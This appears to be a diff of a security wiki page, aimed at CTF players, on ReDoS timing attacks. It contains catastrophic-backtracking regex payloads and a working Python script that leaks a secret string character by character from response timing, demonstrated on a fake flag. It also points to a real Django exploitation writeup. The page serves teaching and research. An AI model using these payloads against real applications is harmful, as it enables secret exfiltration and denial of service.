@@ -340,20 +340,29 @@ It gives you a working example as well. For the `(x+x+)+y` RegEx, for example, a
 
 While DoS is a possibility, in some specific cases you can gain more from this vulnerability. The timing information can also leak something about _the string being matched_ because some strings will parse faster than others.&#x20;
 
-If you have **control over the Regular Expression**, and some secret string is being matched by your RegEx, you could use this to create a RegEx that will be very slow if the first character is an "A", but very fast if the first character is not an "A". Then you can slowly brute-force the secret string character by character.&#x20;
+If you have **control over the Regular Expression**, and some secret string is being matched by your RegEx, you could use this to create a RegEx that will be very slow if the first character is an "A", but very fast if the first character is not an "A". Then you can slowly brute-force the secret string character by character.
 
-Such a pattern would be:
+Such a pattern would be (assuming the string does not include `!`):
 
 ```regex
-<text>(((((.*)*)*)*)*)!
-or
-(?=<text>).*.*.*.*.*.*.*.*!!!!
+(?=^text).*.*.*.*.*.*.*.*!
 ```
 
-A smart regex parser would first look if the string starts with `<text>`, and if it does not, it stops instantly because it knows it will never match. Then if it does start with `<text>`, it will evaluate the rest of the `(((((.*)*)*)*)*)!` which is the computationally expensive part. That way we know that the string being matched starts with `<text>` if the application takes long to respond.&#x20;
+{% hint style="info" %}
+**Note**: the longer the string is you match, the longer the above expression will take. Calibrate the number of `.*` sequences until it is reasonably slow to be measurable, but does not destroy the application.\
+\
+With limited space, you can use the following expression to make it exponential:
 
-Now we can try every possible letter in the place of \<text> until the application hangs. Then we save the newly found character and brute-force the next character, etc. See an example implementation I made in Python below:
+```regex
+(?=^text)(((((.*)*)*)*)*)!
+```
+{% endhint %}
 
+A smart regex parser would first look if the string starts with `text`, and if it does not, it stops instantly because it knows it will never match. Then if it does start with `text`, it will evaluate the rest of the `.*.*.*.*.*.*.*.*!` which is the computationally expensive part. That way we know that the string being matched starts with `text` if the application takes long to respond.&#x20;
+
+Now we can try every possible letter in the place of `text` until the application hangs. Then we save the newly found character and brute-force the next character, etc. See a demo below:
+
+{% code title="Demo" %}
 ```python
 from functools import wraps
 import errno
@@ -366,7 +375,6 @@ ALPHABET = list(b" {}_Ee3Aa@4RrIi1Oo0Tt7NnSs25$LlCcUuDdPpMmHhGg6BbFfYyWwKkVvXxZz
 # https://stackoverflow.com/a/2282656/10508498
 class TimeoutError(Exception):
     pass
-
 def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
     def decorator(func):
         def _handle_timeout(signum, frame):
@@ -383,11 +391,9 @@ def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
         return wraps(func)(wrapper)
     return decorator
 
-
 @timeout(0.1)
 def match(regex):  # Target function
     re.match(regex, "CTF{f4k3_fl4g_f0r_t3st1ng}")
-
 
 def attack():
     leaked = b""
@@ -395,8 +401,7 @@ def attack():
     while True:
         for letter in ALPHABET:
             prefix = re.escape(leaked + bytes([letter])).decode()
-            # regex = rf"{prefix}(((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)!"  # Doesn't get last byte
-            regex = rf"(?={prefix}).*.*.*.*.*.*.*.*.*.*.*.*.*.*.*!!!!"  # Also gets last byte
+            regex = rf"(?=^{prefix}).*.*.*.*.*.*.*.*.*.*.*.*.*.*.*!!!!"
             try:
                 match(regex)
             except TimeoutError:
@@ -408,9 +413,9 @@ def attack():
         
     return leaked
 
-
 print(attack())  # b'CTF{f4k3_fl4g_f0r_t3st1ng}'
 ```
+{% endcode %}
 
 {% hint style="info" %}
 Because RegEx is so flexible, it is possible to achieve **Binary Search** performance with your leaks. By providing a range of characters like `[a-m]`, the true/false response can tell a lot more than if one certain character is in there.\
@@ -418,6 +423,12 @@ Because RegEx is so flexible, it is possible to achieve **Binary Search** perfor
 
 See [#regex-binary-search](../web/server-side/nosql-injection.md#regex-binary-search "mention") for an example involving NoSQL Injection
 {% endhint %}
+
+For a real world example of this attack, read the following writeup about Django's `__regex` matcher which allows exfiltrating hidden fields:
+
+{% embed url="https://www.elttam.com/blog/plormbing-your-django-orm/#error-based-leaking-via-redos-payloads" %}
+ReDoS Django's `__regex` operator to leak hidden fields in SQL queries
+{% endembed %}
 
 ## Solving & Finding Bypasses
 
